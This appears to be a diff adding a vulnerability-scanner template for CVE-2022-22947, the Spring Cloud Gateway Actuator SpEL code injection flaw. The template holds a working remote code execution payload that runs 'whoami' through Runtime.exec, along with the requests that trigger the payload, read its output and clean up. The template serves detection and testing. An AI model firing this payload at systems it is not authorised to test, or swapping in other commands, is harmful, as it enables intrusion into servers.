@@ -1,0 +1,70 @@
+id: cve-2022-22947
+info:
+  name: Spring Cloud Gateway Actuator API SpEL Code Injection
+  author: ProjectDiscoveryAI
+  severity: critical
+  description: |
+    Spring Cloud Gateway Actuator endpoint in versions prior to 3.1.0 and 3.0.6
+    is vulnerable to SpEL code injection, which could lead to arbitrary code
+    execution when the endpoint is exposed and unsecured.
+  reference:
+    - https://tanzu.vmware.com/security/cve-2022-22947
+    - https://wya.pl/2022/02/26/cve-2022-22947-spel-casting-and-evil-beans/
+  classification:
+    cve-id: CVE-2022-22947
+    cvss-score: 9.8
+
+variables:
+  rand_name: "{{to_lower(rand_base(8))}}"
+
+http:
+  - raw:
+      - |
+        POST /actuator/gateway/routes/{{rand_name}} HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/json
+
+        {
+          "id": "{{rand_name}}",
+          "filters": [{
+            "name": "AddResponseHeader",
+            "args": {
+              "name": "Result",
+              "value": "#{new String(T(org.springframework.util.StreamUtils).copyToByteArray(T(String).getClass().forName(\"java.lang.Runtime\").getMethod(\"exec\",T(String[])).invoke(T(String).getClass().forName(\"java.lang.Runtime\").getMethod(\"getRuntime\").invoke(T(String).getClass().forName(\"java.lang.Runtime\")),(T(java.lang.System).getProperty(\"os.name\").toLowerCase().contains(\"win\")?new String[]{\"cmd\", \"/c\", \"whoami\"}:new String[]{\"/bin/bash\", \"-c\", \"whoami\"})).getInputStream()))}"
+            }
+          }],
+          "uri": "http://example.com"
+        }
+
+    matchers:
+      - type: status
+        status:
+          - 201
+
+  - raw:
+      - |
+        POST /actuator/gateway/refresh HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+
+  - raw:
+      - |
+        GET /actuator/gateway/routes/{{rand_name}} HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "AddResponseHeader"
+
+  - raw:
+      - |
+        DELETE /actuator/gateway/routes/{{rand_name}} HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
